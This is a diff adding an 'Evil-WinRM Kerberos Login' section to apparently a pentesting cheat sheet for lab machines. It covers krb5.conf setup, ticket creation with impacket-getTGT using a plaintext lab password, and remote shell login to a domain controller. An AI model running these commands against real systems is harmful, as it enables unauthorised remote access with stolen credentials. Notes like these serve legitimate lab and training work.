@@ -103,3 +103,40 @@ evil-winrm -i 10.10.11.152 -c publicCert.pem -k priv-key.pem -S
 ```
 
 </details>
+
+<details>
+
+<summary>Evil-WinRM Kerberos Login</summary>
+
+Edit /etc/krb5.conf
+
+```bash
+[libdefaults]
+        default_realm = SCRM.LOCAL
+
+[realms]
+SCRM.LOCAL = {
+        kdc = dc1.scrm.local
+}
+
+[domain_realm]
+        .scrm.local = SCRM.LOCAL
+        scrm.local = SCRM.LOCAL
+```
+
+Create ticket for MiscSvc:
+
+```bash
+impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900
+```
+
+Login via evil-winrm
+
+```bash
+export KRB5CCNAME=MiscSvc.ccache
+sudo rdate -n 10.10.11.168
+
+evil-winrm -r scrm.local -i dc1.scrm.local
+```
+
+</details>
